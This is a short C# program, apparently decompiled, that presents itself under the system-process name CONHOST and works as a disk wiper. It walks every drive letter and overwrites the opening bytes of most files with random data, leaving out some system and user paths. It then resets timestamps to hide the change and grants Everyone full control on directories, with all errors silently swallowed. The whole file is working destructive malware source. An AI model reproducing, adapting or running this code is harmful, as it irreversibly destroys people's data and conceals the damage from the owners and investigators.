using System;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;

namespace CONHOST;

internal class Program
{
	private static Random random = new Random();

	private static void Main(string[] args)
	{
		string[] array = new string[26]
		{
			"A", "B", "Z", "Y", "E", "F", "G", "H", "I", "J",
			"K", "L", "M", "N", "O", "P", "Q", "R", "S", "T",
			"U", "V", "W", "X", "D", "C"
		};
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				string sDir = text + ":\\";
				DirSearch_ex3(sDir);
			}
			catch
			{
			}
		}
	}

	private static void DirSearch_ex3(string sDir)
	{
		string[] files = Directory.GetFiles(sDir);
		foreach (string text in files)
		{
			if (text.Contains("Windows") || text.Contains("Users") || text.Contains("Recycle") || text.Contains("BOOT") || text.Contains("boot"))
			{
				continue;
			}
			try
			{
				FileInfo fileInfo = new FileInfo(text);
				DateTime lastWriteTime = fileInfo.LastWriteTime;
				using (FileStream fileStream = new FileStream(text, FileMode.Open, FileAccess.ReadWrite))
				{
					File.SetAttributes(text, FileAttributes.Normal);
					int num = 0;
					while (fileStream.Length != fileStream.Position && (num < 5000 || num > fileStream.Length))
					{
						string value = random.Next(255).ToString();
						byte value2 = Convert.ToByte(value);
						fileStream.Position = num;
						fileStream.WriteByte(value2);
						num++;
					}
				}
				File.SetLastWriteTime(text, lastWriteTime);
			}
			catch
			{
			}
		}
		string[] directories = Directory.GetDirectories(sDir);
		foreach (string text2 in directories)
		{
			try
			{
				DirSearch_ex3(text2);
				DirectoryInfo directoryInfo = new DirectoryInfo(text2);
				DateTime lastWriteTime2 = directoryInfo.LastWriteTime;
				DirectorySecurity accessControl = Directory.GetAccessControl(text2);
				SecurityIdentifier identity = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
				accessControl.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.FullControl, AccessControlType.Allow));
				try
				{
					Directory.SetAccessControl(text2, accessControl);
				}
				catch
				{
					goto end_IL_0132;
				}
				Directory.SetLastWriteTime(text2, lastWriteTime2);
				end_IL_0132:;
			}
			catch
			{
			}
		}
	}
}
